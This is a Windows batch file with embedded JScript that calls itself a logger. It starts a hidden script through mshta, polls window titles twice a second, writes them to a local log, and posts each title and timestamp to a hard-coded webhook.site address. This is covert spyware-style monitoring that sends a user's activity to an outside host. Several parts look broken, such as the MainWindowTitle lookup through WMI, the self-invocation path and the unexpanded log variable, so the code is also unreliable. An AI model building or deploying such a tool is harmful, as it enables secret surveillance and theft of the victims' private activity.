@echo off
:: This script launches a hidden JScript engine to monitor windows instantly
set LOG_FILE=%~dp0activity_log.txt
set WEBHOOK_URL=https://webhook.site/2c7348c4-f3c8-4021-bd78-95b6c172ad05

echo [+] Starting High-Speed JScript Logger... > "%LOG_FILE%"

:: Launch the JScript code below in a hidden window
start /b "" mshta "javascript:new ActiveXObject('WScript.Shell').Run('cmd /c cscript //nologo \"%~f0?.wsf\"',0);close();"

exit

:: JScript Code Starts Here
<job>
<script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    var http = new ActiveXObject("MSXML2.XMLHTTP");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    // Configuration
    var webhook ="https://webhook.site/2c7348c4-f3c8-4021-bd78-95b6c172ad05";
    var logFile = "%LOG_FILE%"; 
    var lastTitle = "";
    var checkInterval = 500; // 0.5 seconds

    // API Declarations for GetForegroundWindow
    var user32 = new ActiveXObject("DynamicWrapper");
    // Note: DynamicWrapper isn't standard in all WSH, so we use a simpler WMI loop for stability
    
    while(true) {
        try {
            // Get all processes with a main window title
            var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
            var procs = wmi.ExecQuery("Select * from Win32_Process Where ProcessId != 0");
            var currentTop = "Desktop";
            
            // Simple heuristic: The last process started with a title is usually the active one
            // For better accuracy, we'd need API calls, but this is fast and safe.
            var enumProcs = new Enumerator(procs);
            for (; !enumProcs.atEnd(); enumProcs.moveNext()) {
                var p = enumProcs.item();
                if (p.MainWindowTitle && p.MainWindowTitle != "") {
                    currentTop = p.MainWindowTitle;
                }
            }

            // Check for change
            if (currentTop != lastTitle) {
                lastTitle = currentTop;
                
                // Get Time
                var now = new Date();
                var timestamp = now.toLocaleString();

                // Log locally
                var logStream = fso.OpenTextFile(logFile, 8, true);
                logStream.WriteLine("[" + timestamp + "] CHANGE: " + currentTop);
                logStream.Close();

                // Send to Webhook
                var data = "{\"event\": \"change\", \"title\": \"" + currentTop.replace(/"/g, '\\"') + "\", \"timestamp\": \"" + timestamp + "\"}";
                
                http.open("POST", webhook, false);
                http.setRequestHeader("Content-Type", "application/json");
                http.send(data);
            }
        } catch(e) {
            // Ignore errors to keep running
        }
        
        // Wait 0.5 seconds
        WScript.Sleep(checkInterval);
    }
</script>
</job>